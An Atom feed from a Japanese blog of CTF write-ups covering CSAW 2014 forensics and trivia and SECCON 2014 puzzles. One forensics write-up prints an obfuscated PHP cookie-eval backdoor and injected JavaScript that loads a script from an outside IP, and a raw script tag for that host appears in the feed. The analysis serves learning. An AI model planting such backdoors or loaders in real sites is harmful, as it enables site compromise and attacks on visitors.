<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: write-up | Hello (forgotten) world]]></title>
  <link href="http://tech.aquarite.info/blog/categories/write-up/atom.xml" rel="self"/>
  <link href="http://tech.aquarite.info/"/>
  <updated>2014-12-07T22:21:15+09:00</updated>
  <id>http://tech.aquarite.info/</id>
  <author>
    <name><![CDATA[Mei Akizuru]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[CSAW CTF 2014 Quals Forensics]]></title>
    <link href="http://tech.aquarite.info/blog/2014/09/23/csawctf2014-forensics/"/>
    <updated>2014-09-23T03:07:38+09:00</updated>
    <id>http://tech.aquarite.info/blog/2014/09/23/csawctf2014-forensics</id>
    <content type="html"><![CDATA[<p>CSAW CTF 2014 Quals、Forensicsのwrite-upです。私が解いたのはForensicsの4問中、200点のObscurityを除いた3問です。</p>

<h1>[100] dumpster diving</h1>

<h2>問題文</h2>

<blockquote><p>dumpsters are cool, but cores are cooler</p>

<p>Written by marc</p>

<p>firefox.mem.zip</p></blockquote>

<h2>解答</h2>

<p>Answer: cd69b4957f06cd818d7bf3d61980e291</p>

<p>与えられるのは&#8217;firefox.mem.zip&#8217;で、コアダンプです。私が取りかかった時点で既に他のメンバーからbinwalkしてみたらSQLiteのなんかが見えていると報告がありました。Firefoxのコアダンプであれば何か見えててもおかしくないですね。</p>

<p>とりあえずstringsで何か見えないかなと思ってstringsの出力結果を&#8217;flag&#8217;でgrepしてみます。</p>

<pre><code>(前略)
etablemoz_annosmoz_annos CREATE TABLE moz_annos (  id INTEGER PRIMARY KEY, place_id INTEGER NOT NULL, anno_attribute_id INTEGER, mime_type VARCHAR(32) DEFAULT NULL, content LONGVARCHAR, flags INTEGER DEFAULT 0, expiration INTEGER DEFAULT 0, type INTEGER DEFAULT 0, dateAdded INTEGER DEFAULT 0, lastModified INTEGER DEFAULT 0)
ZZZZZZZZflag{cd69b4957f06cd818d7bf3d61980e291}
ZZZZZZZZZZZZZZTransparent BG enabling flag
(後略)
</code></pre>

<p>マジで見つかりました。本当にありがとうございました。</p>

<h1>[200] why not sftp?</h1>

<h2>問題文</h2>

<blockquote><p>well seriously, why not?</p>

<p>Written by marc</p>

<p>traffic-5.pcap</p></blockquote>

<h2>解答</h2>

<p>Answer: 91e02cd2b8621d0c05197f645668c5c4</p>

<p>与えられる&#8217;traffic-5.pcap&#8217;をとりあえずWiresharkで見てみます。問題名が&#8217;why not sftp?&lsquo;なんだし、きっとFTP通信でなんかやってるだろうと思ってftpとftp-dataでフィルタします。通信を追っていくと&rsquo;/files/zip.zip&#8217;をダウンロードしています。当該するdataの方の通信をFollow TCP Streamするとflag.pngとか書いてあるのでまず間違いなさそうです。ftp-dataのパケットからzip.zipを抽出します。</p>

<p>取り出したzip.zipはパスワードも何もかかっていないのでそのまま展開します。するとflag.pngが展開され、それにフラグが書かれていました。</p>

<p>余談ですが、HTTPでやりとりしたファイルはWiresharkのExport Objectsから取り出せますが、FTPの場合はデータ通信の方をFollow TCP StreamしてRawで保存すればよいことをお勉強しました。</p>

<h1>[300] Fluffy No More</h1>

<h2>問題文</h2>

<blockquote><p>OH NO WE&rsquo;VE BEEN HACKED!!!!!! &ndash; said the Eye Heart Fluffy Bunnies Blog owner. Life was grand for the fluff fanatic until one day the site&rsquo;s users started to get attacked! Apparently fluffy bunnies are not just a love of fun furry families but also furtive foreign governments. The notorious &ldquo;Forgotten Freaks&rdquo; hacking group was known to be targeting high powered politicians. Were the cute bunnies the next in their long list of conquests!??</p>

<p>Well&hellip; The fluff needs your stuff. I&rsquo;ve pulled the logs from the server for you along with a backup of it&rsquo;s database and configuration. Figure out what is going on!</p>

<p>Written by brad_anton</p>

<p>CSAW2014-FluffyNoMore-v0.1.tar.bz2</p></blockquote>

<h2>解答</h2>

<p>Answer: Those Fluffy Bunnies Make Tummy Bumpy</p>

<p>与えられたアーカイブを展開すると、etc_directory.tar.bz、logs.tar.bz2、webroot.tar.bz2、mysql_backup.sql.bz2の4つのファイルが出てきます。それぞれ、etc以下、/var/log以下、/var/www以下を固めたもので、mysql_backup.sql.bz2はmysqldumpの出力結果をbzip2で圧縮したものです。</p>

<p>/var/www以下やデータベースのダンプを見るにWordPressが動いていて、そこがやられたという状況のようです。ひとまずapache2のaccess.logを見ていきます。非常に大きなファイルですが、大半はツールによるアタック試行のログです。SQLインジェクションやら何やらを色々試しています。データベースのダンプを見るとwp_commentsに犯人による犯行予告（「ハックしてやったぜBWHAHAHAHA」じゃなくて「ハックしてやるぜBWHAHAHA」だった）があるので、そのコメントの時刻以降のログを見てみます。</p>

<p>まずPOSTに絞って見てみるとプラグイン絡みでちょっと怪しげなログを見つけました。wysija-newslettersというプラグインで、そのプラグインについて調べてみたところ、任意ファイルのアップロードが可能な脆弱性が存在していたそうです。その後その脆弱性は修正されましたが、実際にはPHPの設定によってはその対策をすり抜けることが可能でした（そしてさらに対策される）。この環境にインストールされているもののバージョンを調べてみると、ちょうどその脆弱性が残っていたバージョンだった上に、<a href="http://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html">WordPress Security - MailPoet Vuln Contributes to Thousands of Infected Websites | Sucuri Blog</a>で言及されているのと同じ形のログが残っていました。</p>

<p>アクセスログから/wp-content/uploads/wysija/themes/weblizer/template.phpというのにアクセスしていることがわかったので、そのファイルを見てみます。中身は次のようなPHPファイルです。</p>

<pre><code>&lt;?php
$hije = str_replace("ey","","seyteyrey_reyeeypleyaeyceye");
$andp="JsqGMsq9J2NvdW50JzskYT0kX0NPT0tJRTtpZihyZXNldCgkYSsqk9PSdoYScgJisqYgsqJsqGMoJ";
$rhhm="nsqKSwgam9pbihhcnJheV9zbGljZSgkYSwksqYygkYSksqtMykpKSksqpO2VjaG8sqgJsqzwvJy4kay4nPic7fQ==";
$pvqw="GEpPjMpeyRrPSdja2l0JztlY2hvICc8Jy4kaysq4nPicsq7ZXZhbChsqiYXNlNjRfZGVjb2RlKHByZsqWdfcmVw";
$wfrm="bGFjZShhcnsqJheSsqgsqnsqL1teXHcsq9XHNdLycsJy9ccy8nKSwgYsqXJyYXksqoJycsJyssq";
$vyoh = $hije("n", "", "nbnansne64n_ndnecode");
$bpzy = $hije("z","","zczreaztzez_zfzuznzcztzizon");
$xhju = $bpzy('', $vyoh($hije("sq", "", $andp.$pvqw.$wfrm.$rhhm))); $xhju();
?&gt;
</code></pre>

<p><code>$hije</code>が<code>str_replace</code>、<code>$vyoh</code>が<code>base64_decode</code>、<code>$bpzy</code>が<code>create_function</code>関数です。このとき初めて知ったんですが、PHPでは文字列変数に対して<code>$hoge()</code>みたいに<code>()</code>を付けて使うと、その変数に入っている名前の関数を呼び出すという機能があります。びっくり。</p>

<p>それはともかくとして、このコードは</p>

<ol>
<li><code>$andp</code>、<code>$pvqw</code>、<code>$wfrm</code>、<code>$rhhm</code>を結合する</li>
<li>その中の&#8217;sq&#8217;を取り除く</li>
<li>その文字列をBase64デコードする</li>
<li>その文字列を関数化する</li>
<li>それを実行する</li>
</ol>


<p>というコードです。<code>create_function</code>で関数化されたコードは次のコードです（実際の出力を整形しています）</p>

<pre><code>$c='count';
$a=$_COOKIE;
if (reset($a) == 'ha' &amp;&amp; $c($a) &gt; 3) {
  $k='ckit';
  echo '&lt;'.$k.'&gt;';
  eval(base64_decode(preg_replace(array('/[^\w=\s]/','/\s/'), array('','+'), join(array_slice($a,$c($a)-3)))));
  echo '&lt;/'.$k.'&gt;';
}
</code></pre>

<p>Cookieが所定の条件を満たすとき、その中に入っているBase64文字列をevalする、というコードのようです。どう見てもバックドアです。本当にありがとうございました。</p>

<p>しかし、ログに記録されてない上にパケットキャプチャもないので、Cookieの中身はわかりません。つまりどんなコードが実行されたのかが全く不明です。データベースの中に何かしら残っていないか探してみましたが見つかりません。ここで一旦手詰まりとなってしまいました。</p>

<p>そこで隣に座ってた某氏が&#8217;/var/log/auth.log&#8217;を見ていて次の箇所を指摘しました。</p>

<pre><code>Sep 17 19:20:09 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/usr/bin/vi /var/www/html/wp-content/themes/twentythirteen/js/html5.js
</code></pre>

<p>ご覧の通り、sudoでviが実行されています。察し。……ていうかubuntuユーザーでログインされてsudoまでされてるんですがそれは……。</p>

<p>それはともかく/wp-content/themes/twentythirteen/js/html5.jsを見てみます。先頭のコメントにHTML5 Shivとあります。バージョンは3.7.0。<a href="https://github.com/aFarkas/html5shiv">HTML5Shivのリポジトリ</a>から3.7.0のファイルをダウンロードし、このファイルとの差異を探すと、末尾に次のコードが追加されていました。</p>

<pre><code>var g="ti";var c="HTML Tags";var f=". li colgroup br src datalist script option .";f = f.split(" ");c="";k="/";m=f[6];for(var i=0;i&lt;f.length;i++){c+=f[i].length.toString();}v=f[0];x="\'ht";b=f[4];f=2541*6-35+46+12-15269;c+=f.toString();f=(56+31+68*65+41-548)/4000-1;c+=f.toString();f="";c=c.split("");var w=0;u="s";for(var i=0;i&lt;c.length;i++){if(((i==3||i==6)&amp;&amp;w!=2)||((i==8)&amp;&amp;w==2)){f+=String.fromCharCode(46);w++;}f+=c[i];} i=k+"anal"; document.write("&lt;"+m+" "+b+"="+x+"tp:"+k+k+f+i+"y"+g+"c"+u+v+"j"+u+"\'&gt;\&lt;/"+m+"\&gt;");
</code></pre>

<p><a href="http://jsbeautifier.org/">beautify</a>してみます。</p>

<pre><code>var g = "ti";
var c = "HTML Tags";
var f = ". li colgroup br src datalist script option .";
f = f.split(" ");
c = "";
k = "/";
m = f[6];
for (var i = 0; i &lt; f.length; i++) {
    c += f[i].length.toString();
}
v = f[0];
x = "\'ht";
b = f[4];
f = 2541 * 6 - 35 + 46 + 12 - 15269;
c += f.toString();
f = (56 + 31 + 68 * 65 + 41 - 548) / 4000 - 1;
c += f.toString();
f = "";
c = c.split("");
var w = 0;
u = "s";
for (var i = 0; i &lt; c.length; i++) {
    if (((i == 3 || i == 6) &amp;&amp; w != 2) || ((i == 8) &amp;&amp; w == 2)) {
        f += String.fromCharCode(46);
        w++;
    }
    f += c[i];
}
i = k + "anal";
document.write("&lt;" + m + " " + b + "=" + x + "tp:" + k + k + f + i + "y" + g + "c" + u + v + "j" + u + "\'&gt;\&lt;/" + m + "\&gt;");
</code></pre>

<p>このコードをnodeに与えて、<code>document.write</code>の引数になっている文字列を見てみると次のようになります。</p>

<p>&#8220;`</p>

<script src='http://128.238.66.100/analytics.js'></script>


<pre><code>
つまりhtml5.jsが実行されると'http://128.238.66.100/analytics.js'が読まれて実行されるわけです。ここにアクセスしてanalytics.jsを見てみます（長いので中身は省略します）。すると、明らかにおかしな箇所がありました。
</code></pre>

<p>var _0x91fe = [&ldquo;\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66&rdquo;, &ldquo;\x5F\x73\x65\x6C\x66&rdquo;, &ldquo;\x6F\x70\x65\x6E&rdquo;];
window<a href="_0x91fe[0],%20_0x91fe[1]">_0x91fe[2]</a>;
&#8220;`</p>

<p><code>_0x91fe</code>に代入している箇所をnodeに与えて中身を見てみます。</p>

<pre><code>&gt; var _0x91fe = ["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66", "\x5F\x73\x65\x6C\x66", "\x6F\x70\x65\x6E"];
undefined
&gt; _0x91fe
[ 'http://128.238.66.100/announcement.pdf',
  '_self',
  'open' ]
</code></pre>

<p>これを踏まえた上で先のコードの2行目を見れば、<code>window['open']</code>(<code>window.open</code>関数)で&#8217;<a href="http://128.238.66.100/announcement.pdf">http://128.238.66.100/announcement.pdf</a>&#8216;を開いていることになります。</p>

<p>&lsquo;<a href="http://128.238.66.100/announcement.pdf">http://128.238.66.100/announcement.pdf</a>&#8216;は実際にPDFで、なんかビジュアル系バンドっぽい人物の写真に&#8217;I AM HACKING YOU RIGHT NOW&#8217;という文が書いてある画像があるだけのPDFです。</p>

<p>ひとしきりここで爆笑して作業に戻りますと、pdfextractでストリームデータをダンプしてみるように言われました。-sオプションを使ってストリームをダンプします。結果として&#8217;stream_{1,2,3,8}.dmp&#8217;の4つのファイルが現れます。これらに対してひとまずstringsをしてみます（ていうか先にfileで見てみるべきだったかもしれない）。すると&#8217;stream_8.dmp&#8217;に何か書かれています。</p>

<pre><code>var _0xee0b=["\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"];var y=_0xee0b[0];
</code></pre>

<p>JavaScriptっぽいのでnodeに与えてみます。</p>

<pre><code>&gt; var _0xee0b=["\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"];var y=_0xee0b[0];
undefined
&gt; _0xee0b
[ 'YOU DID IT! CONGRATS! fwiw, javascript obfuscation is sofa king dumb  :) key{Those Fluffy Bunnies Make Tummy Bumpy}' ]
</code></pre>

<p>というわけで無事にフラグを得ることができました。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CSAW CTF 2014 Quals Trivia]]></title>
    <link href="http://tech.aquarite.info/blog/2014/09/22/csawctf2014-trivia/"/>
    <updated>2014-09-22T20:18:08+09:00</updated>
    <id>http://tech.aquarite.info/blog/2014/09/22/csawctf2014-trivia</id>
    <content type="html"><![CDATA[<p>CSAW CTF 2014 Qualsに参加してました。日本時間で20日07:00から22日07:00までの48時間。都内某所に泊まり込みでした。そんな感じでWrite-upでございます。この記事はTrivia。</p>

<p>Triviaは全て10点で全6問。うち私が解答したのは3問でした。</p>

<h1>Shameless plug</h1>

<h2>問題文</h2>

<p>This is the name of the new USENIX workshop that featured papers on CTFs being used for education.</p>

<h2>解答</h2>

<p>Answer: 3GSE</p>

<p>&ldquo;USENIX workshop CTF&#8221;でググると&#8221;The Fun and Future of CTF | USENIX&#8221;というのが最初に出てきます。このpaperの投稿先が3GSE &lsquo;14でした。</p>

<h1>We don&rsquo;t know either</h1>

<h2>問題文</h2>

<p>On this day in November, the CSAW Career Fair takes place in Brooklyn, New York.</p>

<h2>解答</h2>

<p>Answer: 14</p>

<p>CSAWのページ（CTFでない）に行くとイベントの中にCareer Fairがあります。そのイベントページに行ってRegistrationのリンクを辿るとNov 13 - Nov 15で何かやってるらしいことがわかります。</p>

<h1>Twitter will you give me @kchung?</h1>

<h2>問題文</h2>

<p>This is the Twitter handle of the student who runs CSAW CTF.</p>

<h2>解答</h2>

<p>Answer: poopsec</p>

<p>&ldquo;kchung&#8221;というのはCSAW CTFの中の人のひとり、Kevin Chung氏。ところがTwitterで@kchungは別の誰かが取っています。彼自身がTwitterで使っている名前が答えなのでTwitterのアカウントを探します。</p>

<p>とりあえず&#8221;Kevin Chung&#8221;でググってみると同姓同名の人物のプロフィールやら何やらが見つかりますが、その中にcodekevin.comというサイトがあります。これが彼のWebサイトで、ここにTwitterのホームへのリンクがあります。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SECCON 2014 オンライン予選 その他諸々]]></title>
    <link href="http://tech.aquarite.info/blog/2014/07/20/seccon2014-online-preliminary/"/>
    <updated>2014-07-20T19:24:34+09:00</updated>
    <id>http://tech.aquarite.info/blog/2014/07/20/seccon2014-online-preliminary</id>
    <content type="html"><![CDATA[<p>2014-07-19 09:00 - 21:00に行われたSECCON 2014 オンライン予選について、その他諸々。</p>

<p>個別に書いたのは次の2つ。</p>

<ul>
<li><a href="/blog/2014/07/20/seccon2014-online-amida/">あみだくじ</a></li>
<li><a href="/blog/2014/07/20/seccon2014-online-printit/">Print it</a></li>
</ul>


<p>この2つとここで書かれていないのは問題見てすらいません˙꒳˙</p>

<h2>decode me</h2>

<p>ダウンロードした<code>encoded.txt</code>を見ると盛大に文字化けしてるんだけど、<code>FRPPBA 2014</code>という文字を見た瞬間にここが<code>SECCON 2014</code>であることを確信。ということは換字式暗号か何かなんだろうけど、<code>ebg13/47</code>という文字が気になる。とここで@re_Ordが「rot13/47というのがあるらしい」。なんじゃそりゃと思って調べてみると、rot13を拡張したそういう暗号があるらしかった。</p>

<p>rot13/47はnkfコマンドで簡単に変換出来るので、それを実行しておしまい。</p>

<h2>ソーシャルハック？</h2>

<p>私はページを開いて「天安門事件」って入力したら即座に退出されてしまったのであんまり遊んでません。</p>

<h2>捏造された契約書を暴け</h2>

<p>降ってきたファイルを展開すると<code>Timestamp.dd</code>というファイルが得られる。ここから特定の日付以降になってるようなファイルを探す。日付だから年が入ってるだろうと思って、マウントして云々とかは一切せずに<code>strings Timestamp.dd | grep 2012</code>とかやると1つだけ結果が出てくる。</p>

<p>……で、300点問題だし、まさかそんなわけないよねー、と思ってそれをスルーしてマウントして探し始めたところ、隣で@yuscarletがこの問題を通していた。正解はまさかの先ほど<code>strings</code>やって出てきた日付だったらしい。</p>

<p>よくわかんなくてもとりあえず送信しておくべきですね（白目）</p>

<h2>重ねてみよう</h2>

<p>チーム複数人でまずImageMagickでgif画像を分解して合成云々で粘っていた。これ合成したらQRコードとか出てくるんだろとか思っていたら実際に出てきたのはQRコードでした。</p>

<p>ちなみに、ImageMagickでgif画像を分解、色を反転、透過色を設定……ってやったけどどうにも合成が上手く行ってなかったらしい。で、最終的に取った手段は透過色の設定までやった画像ファイルを全部GIMPに突っ込んでレイヤーとして開き、一番下に白一色のレイヤーを追加するという方法でした。GIMP最強じゃん（</p>

<h2>詰将棋</h2>

<p>突然のurandom将棋部発足。私は何もしてません（</p>

<p>盤面をにらめっこして頭の中で考えるよりも、適当な紙を用意して駒と盤面作った方がよかったようです。</p>

<h2>諸々</h2>

<p>チーム内連携で解けた割と問題があって、今回は結構みんな神が降りていた気がします。ググれる文鎮とは私のことだ！（迫真）</p>

<p>最後の1時間くらい、他のメンバーがDecrypt it!を解いている間に祈っていたら、どうやら全国行けるようです。最後の瞬間のランキングを確認してないんですがひょっとしたらチーム1位かもしれません。やったね。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SECCON 2014 オンライン予選 【Print it!】]]></title>
    <link href="http://tech.aquarite.info/blog/2014/07/20/seccon2014-online-printit/"/>
    <updated>2014-07-20T18:53:55+09:00</updated>
    <id>http://tech.aquarite.info/blog/2014/07/20/seccon2014-online-printit</id>
    <content type="html"><![CDATA[<p>2014-07-19 09:00 - 21:00に行われたSECCON 2014 オンライン予選のWrite-upです。次は「Print it!」。</p>

<h2>問題概要</h2>

<p>謎のファイルが降ってきます。以上。</p>

<h2>解法</h2>

<p>降ってきたファイルの正体は&#8221;Standard Triangulated Language&#8221;というフォーマットのファイル(参考: <a href="http://ja.wikipedia.org/wiki/Standard_Triangulated_Language">Wikipedia</a>)で、このフォーマットのバイナリ形式で記録された3Dモデルです。このファイルを適切なアプリケーションで開くと3Dモデルを見ることが出来て、そのモデルにフラグが書かれています。</p>

<p>ans: <code>Bar1kaTaLab.</code></p>

<h2>経緯</h2>

<p>とりあえずファイルをバイナリエディタに突っ込んでビットマップで見てみると、かなり規則性の高いらしいということはわかったのですが、それ以上のことはさっぱりわからず。nullが14個くらい続いてたりとか、それが繰り返されてたりとか、その辺の規則性が高いわりに、先頭には普通にテキストが入っているし、テキストの間にはまたもnullが入っていてよくわかんないなぁと思ってました。</p>

<p>先頭のテキストには意味がないんじゃないかと思って削ってみても、削った後の先頭数バイトが何かのシグネチャになってるわけではありませんでした。あと、前述のnullが続いている箇所がかなり多いことから圧縮されているわけでもなさそうだということはわかりました。</p>

<p>問題名がPrint it!なので、きっと何かにPrintするんだろうと思って、仮想プリンタドライバにlprコマンドでデータを送りつけても何も起きませんでした。他に&#8221;Print&#8221;に関係しそうなファイルフォーマットを考えてみましたが、たいていがテキスト形式のもので、問題ファイルとは噛み合いません。あとpbcopyでコピーしてコンソールに無理矢理突っ込んだらえらい目にあいました。</p>

<p>じゃあテキストに意味があるのだろうと思って削らないままで眺めてみると、先頭のテキスト（＋謎データ）群のサイズがちょうど80bytesでした（&#8221;Thanks!&ldquo;で終わっていたので切れ目はわかりやすかった）。80byte、やたらキリがいい。そんな話を@6f70として、じゃあきっと先頭80bytesは何かしらのヘッダーに違いない！　……ということで、先頭80bytesがヘッダになってるようなファイルフォーマットを探すと……</p>

<p><img src="/images/seccon2014-printit-google.png"></p>

<p>……なるほどね（白目）</p>

<p>これほどまでに検索結果のスニペットが欲しい情報をピンポイントで持ってきたことはもはや感動的ですらあるので引用しておくと</p>

<p><blockquote><p>米国のスリーディー・システムズ（英語版）によって開発された三次元CADソフト用の<strong>ファイルフォーマットシステム</strong>。多くのソフトにサポートされ &hellip; バイナリーSTLファイルは<strong>80バイト</strong>の任意の文字列で開始される（通常内容は無視される。ただし、 solid から記載を  &hellip;</p></blockquote></p>

<p>そんなわけで、このファイルフォーマットのバイナリ形式では先頭80bytesは無視されること、このフォーマットはfloatの値がずらーっと並んでいることがわかりました。floatの値が並んでいるだけなら、確かにデータに規則性があって、nullが連続しているのも納得です。</p>

<p>私のマシンにはこれを見られるものがなかったので、Wikipediaの記事の外部リンクにあった3DViewというChromeのアプリを入れてファイルを読むことで解答が得られました。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SECCON 2014 オンライン予選 【あみだくじ】]]></title>
    <link href="http://tech.aquarite.info/blog/2014/07/20/seccon2014-online-amida/"/>
    <updated>2014-07-20T00:29:19+09:00</updated>
    <id>http://tech.aquarite.info/blog/2014/07/20/seccon2014-online-amida</id>
    <content type="html"><![CDATA[<p>2014-07-19 09:00 - 21:00に行われたSECCON 2014 オンライン予選のWrite-upです。今回は「あみだくじ」。</p>

<h2>問題概要</h2>

<p>問題は64bit ELF形式の実行ファイル<code>amida</code>。これを実行すると「No.i」(i = 1, 2, &hellip;)と書かれた行に続けて1から順に番号が振られたあみだくじが表示され、いずれかの終端の1箇所に*印がついている。……が、後になると</p>

<ul>
<li>番号の振り方が逆 (左から1, 2, &hellip;ではなく8, 7, &hellip;になっている)</li>
<li>そもそもくじの上下が逆</li>
<li>各行の先頭にnull文字が突っ込まれている <ins datetime="2014-07-22T10:21:00+09:00">（追記: これは出題者の意図していない、問題プログラムのバグだった模様）</ins></li>
<li>くじの縦線の間が広がる</li>
<li>くじが横向きになる</li>
</ul>


<p>……といった面白形式で表示されるようになります。具体例は最後に書いてあるのでそちらを。</p>

<h2>解法</h2>

<p>問題を確認せずに1から順に解答してみる。</p>

<p>やることとしては、次の手順をフラグが得られるまで繰り返します。</p>

<ol>
<li><code>amida</code>は問題を出力した後<code>?</code>という文字を出力して入力待ちに入るのでそれが見つかるまで読み捨てる</li>
<li>次の解答を試す</li>
<li>正解ならその番号を記録して、試行する番号を1にリセット。次の問題へ。</li>
<li>不正解なら<code>amida</code>は<code>Wrong</code>を出力して終了するので、<code>amida</code>を再び立ち上げて、これまでの正解番号を次々に入力して、失敗したところまで進める。</li>
</ol>


<p>なお、実際には問題の記録のために問題は読み捨てるのではなく、読んだものをファイルに保存しました。</p>

<p>この方針の提案と、この後に行うソルバの実装は@yuscarletがC++で、amidaとソルバの間を適当に受け持つ部分をRubyで私が実装しました。最終的に使用した総当たり方式はRubyのみで実装しました。</p>

<p>ところでamidaの実行ファイルなんですが、異様に問題出力が遅いんですね。私と@yuscarletが順当（？）にプログラム書いてる一方で@6f70が<code>amida</code>のプログラムを解析していて、それによって「問題数は1000問であること」、「問題を出力する際に<code>sleep</code>が噛まされている」ということがわかりました。そこで彼が問題を出力するときに挟まっている<code>sleep</code>を潰したバイナリを用意して、それを用いて総当たり法を実行。結果としてプログラムを動かしてから5分かそこらくらいでフラグを得ました。</p>

<p>ans: <code>c4693af1761200417d5645bd084e28f0f2b426bf</code></p>

<h2>その他諸々</h2>

<p>一旦この総当たり方式で実装してみたんですが、どうにも上手く行かなかった（問題の終了判定が上下が逆転しているケースに対応していなかったり諸々）のとさすがにあまりにも遅かったので（この原因は上述の<code>sleep</code>）ソルバで真っ正面から解いてみようということになりました。</p>

<p>（※最初は1行ずつ読んで判定していたので上手く行きませんでした。ソルバによる解答を諦めた後に1文字ずつ読めばいいことに気がついて上述の解答となりました）</p>

<p>番号やらくじの向きやら幅やらが変わっていることに気がつく度にソルバやらRubyのプログラムやらを修正していたんですが、51番目でくじが横向きになっているのがわかると「こんな調子でいろんなパターン対応してたらキリがない」として、ソルバによる解答を放棄して、最初の総当たり方式に戻しました（ちなみに他の方のwrite-upを読むとどうやら100問目までで全パターンが出ていた模様）。</p>

<p>あと番号が逆とかくじの上下が逆とかはともかくとして、null文字突っ込まれてるのは最高にタチが悪いと思いました（小並感）。これ、ソルバによる解答をしているときに遭遇してめちゃくちゃ悩んでて、最終的に問題をファイルに保存してvimで眺めるまでわかりませんでした。</p>

<p>それと1000問あるらしいということと<code>sleep</code>が入っていることがわかったのは結構大きかったですね。前者がわかっていたことでソルバによる対応を諦める判断をすぐに下せましたし、後者が判明していたこと、かつそれを潰せたことで、解答にかかる時間をかなり短縮出来ました。</p>

<h2>コード</h2>

<p><a href="https://gist.github.com/mayth/f162efa8dc06cd05e5e3">gist</a></p>

<p><figure class='code'><figcaption><span> (amida.rb)</span> <a href='/downloads/code/amida.rb'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="k">def</span> <span class="nf">read_problem</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
</span><span class='line'>  <span class="n">problem</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span><span class='line'>  <span class="kp">loop</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">ch</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">getc</span>
</span><span class='line'>    <span class="k">break</span> <span class="k">if</span> <span class="o">!</span><span class="n">ch</span> <span class="o">||</span> <span class="n">ch</span> <span class="o">==</span> <span class="s1">&#39;?&#39;</span>
</span><span class='line'>    <span class="n">problem</span> <span class="o">&lt;&lt;</span> <span class="n">ch</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="n">io</span><span class="o">.</span><span class="n">getc</span>
</span><span class='line'>  <span class="n">problem</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="n">answers</span> <span class="o">=</span> <span class="o">[]</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">playback</span><span class="p">(</span><span class="n">answers</span><span class="p">,</span> <span class="n">io</span><span class="p">)</span>
</span><span class='line'>  <span class="n">answers</span><span class="o">.</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">ans</span><span class="o">|</span>
</span><span class='line'>    <span class="n">read_problem</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
